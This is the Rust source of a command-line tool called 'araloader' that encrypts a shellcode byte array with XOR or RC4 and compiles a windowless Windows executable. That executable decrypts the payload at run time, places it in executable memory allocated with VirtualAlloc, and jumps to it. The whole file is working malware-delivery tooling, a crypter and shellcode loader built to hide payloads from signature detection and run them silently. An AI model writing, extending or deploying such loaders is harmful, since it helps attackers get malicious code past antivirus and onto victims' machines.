use clap::{Parser, ValueEnum};
use regex::Regex;
use std::fs;
use std::io::Write;
use std::path::PathBuf;
use std::process::Command;
use rand::Rng;

#[derive(Debug, Clone, ValueEnum)]
enum EncryptionMode {
    Xor,
    Rc4,
}

#[derive(Parser, Debug)]
#[command(name = "araloader")]
#[command(about = "Build self-decrypting Windows executables from C byte arrays, or extract binaries to C arrays")]
struct Args {
    /// Input file containing C byte array or binary (with --extract)
    #[arg(short, long)]
    input: PathBuf,

    /// Output file path
    #[arg(short, long, default_value = "payload.exe")]
    output: PathBuf,

    /// Encryption mode: xor or rc4
    #[arg(short, long, value_enum, default_value = "rc4")]
    encrypt: EncryptionMode,

    /// Encryption key (if not provided, random key is generated)
    #[arg(short, long)]
    key: Option<String>,

    /// Output encryption key to file
    #[arg(long)]
    keyfile: Option<PathBuf>,

    /// Extract binary file to C byte array (disable encryption)
    #[arg(long)]
    extract: bool,
}

fn main() {
    let args = Args::parse();

    // Extract mode: convert binary file to C array
    if args.extract {
        let binary_data = fs::read(&args.input).expect("Failed to read binary input file");
        let c_array = bytes_to_c_array(&binary_data);
        fs::write(&args.output, c_array).expect("Failed to write output file");
        println!("[+] Extracted {} bytes from {}", binary_data.len(), args.input.display());
        println!("[+] C array saved to: {}", args.output.display());
        return;
    }

    // Build mode: create self-decrypting executable
    let content = fs::read_to_string(&args.input).expect("Failed to read input file");

    // Extract byte array payload
    let bytes = extract_bytes(&content).expect("Failed to extract byte array");
    let original_size = bytes.len();

    // Encrypt payload
    let (encrypted_bytes, key) = match args.encrypt {
        EncryptionMode::Xor => {
            let key = args.key.unwrap_or_else(generate_random_key);
            let encrypted = xor_encrypt(&bytes, &key);
            println!("[+] XOR encrypted with key: {}", key);
            (encrypted, key)
        }
        EncryptionMode::Rc4 => {
            let key = args.key.unwrap_or_else(generate_random_key);
            let encrypted = rc4_encrypt(&bytes, &key);
            println!("[+] RC4 encrypted with key: {}", key);
            (encrypted, key)
        }
    };

    // Generate Rust stub with embedded encrypted payload
    let use_rc4 = matches!(args.encrypt, EncryptionMode::Rc4);
    let rust_code = generate_stub(&encrypted_bytes, &key, use_rc4);

    // Compile with rustc
    println!("[*] Compiling self-decrypting stub...");

    let mut child = Command::new("rustc")
        .arg("--edition")
        .arg("2021")
        .arg("--target")
        .arg("x86_64-pc-windows-gnu")
        .arg("-O")
        .arg("-C")
        .arg("opt-level=3")
        .arg("-C")
        .arg("link-arg=-static-libgcc")
        .arg("-C")
        .arg("link-arg=-mwindows")
        .arg("-")
        .arg("-o")
        .arg(&args.output)
        .stdin(std::process::Stdio::piped())
        .spawn()
        .expect("Failed to spawn rustc");

    if let Some(mut stdin) = child.stdin.take() {
        stdin.write_all(rust_code.as_bytes()).expect("Failed to write to rustc stdin");
    }

    let output = child.wait_with_output().expect("Failed to wait on rustc");

    if !output.status.success() {
        eprintln!("Compilation failed!");
        eprintln!("{}", String::from_utf8_lossy(&output.stderr));
        return;
    }

    println!("[+] Original payload: {} bytes", original_size);
    println!("[+] Encrypted payload: {} bytes", encrypted_bytes.len());
    println!("[+] Final executable: {}", args.output.display());

    // Save key if requested
    if let Some(keyfile) = &args.keyfile {
        fs::write(&keyfile, &key).expect("Failed to write key file");
        println!("[+] Key saved to: {}", keyfile.display());
    }

    println!("\n[+] Ready to run: {}", args.output.display());
}

fn extract_bytes(content: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let re = Regex::new(r#"\\x([0-9a-fA-F]{2})"#)?;
    let mut bytes = Vec::new();

    for cap in re.captures_iter(content) {
        let hex_str = &cap[1];
        let byte = u8::from_str_radix(hex_str, 16)?;
        bytes.push(byte);
    }

    if bytes.is_empty() {
        return Err("No byte array found in input file".into());
    }

    Ok(bytes)
}

fn bytes_to_c_array(bytes: &[u8]) -> String {
    let mut result = String::from("unsigned char buf[] = \n\"");
    let mut line = String::new();

    for (i, byte) in bytes.iter().enumerate() {
        if i > 0 && i % 16 == 0 {
            result.push_str(&line);
            result.push_str("\"\n\"");
            line.clear();
        }
        line.push_str(&format!("\\x{:02x}", byte));
    }

    if !line.is_empty() {
        result.push_str(&line);
    }
    result.push_str("\";");

    result
}

fn generate_random_key() -> String {
    let random_bytes: [u8; 32] = rand::thread_rng().gen();
    hex::encode(random_bytes)
}

fn xor_encrypt(data: &[u8], key: &str) -> Vec<u8> {
    let key_bytes = key.as_bytes();
    data.iter()
        .enumerate()
        .map(|(i, byte)| byte ^ key_bytes[i % key_bytes.len()])
        .collect()
}

fn rc4_encrypt(data: &[u8], key: &str) -> Vec<u8> {
    let key_bytes = key.as_bytes();
    let mut s: Vec<u8> = (0..=255).collect();

    // KSA (Key Scheduling Algorithm)
    let mut j = 0;
    for i in 0..256 {
        j = (j + s[i] as usize + key_bytes[i % key_bytes.len()] as usize) & 0xff;
        s.swap(i, j);
    }

    // PRGA (Pseudo-Random Generation Algorithm)
    let mut i = 0;
    let mut j = 0;
    data.iter()
        .map(|byte| {
            i = (i + 1) & 0xff;
            j = (j + s[i] as usize) & 0xff;
            s.swap(i, j);
            let k = s[(s[i] as usize + s[j] as usize) & 0xff] as u8;
            byte ^ k
        })
        .collect()
}

fn generate_stub(encrypted_data: &[u8], key: &str, use_rc4: bool) -> String {
    let b64_data = base64_encode(encrypted_data);
    let decryptor = if use_rc4 {
        "rc4_decrypt"
    } else {
        "xor_decrypt"
    };

    format!(r#"
#![windows_subsystem = "windows"]

#[cfg(target_os = "windows")]
mod windows_ffi {{
    #[link(name = "kernel32")]
    extern "system" {{
        pub fn VirtualAlloc(
            lpAddress: *mut std::ffi::c_void,
            dwSize: usize,
            flAllocationType: u32,
            flProtect: u32,
        ) -> *mut std::ffi::c_void;
    }}
}}

fn base64_decode(s: &str) -> Vec<u8> {{
    let alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = Vec::new();
    let mut acc = 0u32;
    let mut bits = 0;

    for c in s.chars() {{
        if c == '=' {{ break; }}
        if let Some(idx) = alphabet.find(c) {{
            acc = (acc << 6) | (idx as u32);
            bits += 6;
            if bits >= 8 {{
                bits -= 8;
                result.push((acc >> bits) as u8);
                acc &= (1 << bits) - 1;
            }}
        }}
    }}
    result
}}

#[allow(dead_code)]
fn xor_decrypt(data: &[u8], key: &str) -> Vec<u8> {{
    let key_bytes = key.as_bytes();
    data.iter()
        .enumerate()
        .map(|(i, byte)| byte ^ key_bytes[i % key_bytes.len()])
        .collect()
}}

#[allow(dead_code)]
fn rc4_decrypt(data: &[u8], key: &str) -> Vec<u8> {{
    let key_bytes = key.as_bytes();
    let mut s: Vec<u8> = (0..=255).collect();
    let mut j = 0;

    for i in 0..256 {{
        j = (j + s[i] as usize + key_bytes[i % key_bytes.len()] as usize) & 0xff;
        s.swap(i, j);
    }}

    let mut i = 0;
    let mut j = 0;
    data.iter()
        .map(|byte| {{
            i = (i + 1) & 0xff;
            j = (j + s[i] as usize) & 0xff;
            s.swap(i, j);
            let k = s[(s[i] as usize + s[j] as usize) & 0xff] as u8;
            byte ^ k
        }})
        .collect()
}}

#[cfg(target_os = "windows")]
fn main() {{
    use windows_ffi::*;

    let encrypted_b64 = "{}";
    let encrypted = base64_decode(encrypted_b64);
    let key = "{}";
    let decrypted = {}(&encrypted, key);

    unsafe {{
        const MEM_COMMIT: u32 = 0x1000;
        const MEM_RESERVE: u32 = 0x2000;
        const PAGE_EXECUTE_READWRITE: u32 = 0x40;

        let size = decrypted.len();
        let ptr = VirtualAlloc(
            std::ptr::null_mut(),
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if !ptr.is_null() {{
            std::ptr::copy_nonoverlapping(
                decrypted.as_ptr(),
                ptr as *mut u8,
                size,
            );

            let code_fn: extern "system" fn() = std::mem::transmute(ptr);
            code_fn();
        }}
    }}
}}

#[cfg(not(target_os = "windows"))]
fn main() {{}}
"#, b64_data, key, decryptor)
}

fn base64_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();
    let mut i = 0;

    while i < data.len() {
        let b1 = data[i];
        let b2 = if i + 1 < data.len() { data[i + 1] } else { 0 };
        let b3 = if i + 2 < data.len() { data[i + 2] } else { 0 };

        result.push(ALPHABET[(b1 >> 2) as usize] as char);
        result.push(ALPHABET[(((b1 & 0x03) << 4) | (b2 >> 4)) as usize] as char);

        if i + 1 < data.len() {
            result.push(ALPHABET[(((b2 & 0x0f) << 2) | (b3 >> 6)) as usize] as char);
        } else {
            result.push('=');
        }

        if i + 2 < data.len() {
            result.push(ALPHABET[(b3 & 0x3f) as usize] as char);
        } else {
            result.push('=');
        }

        i += 3;
    }

    result
}
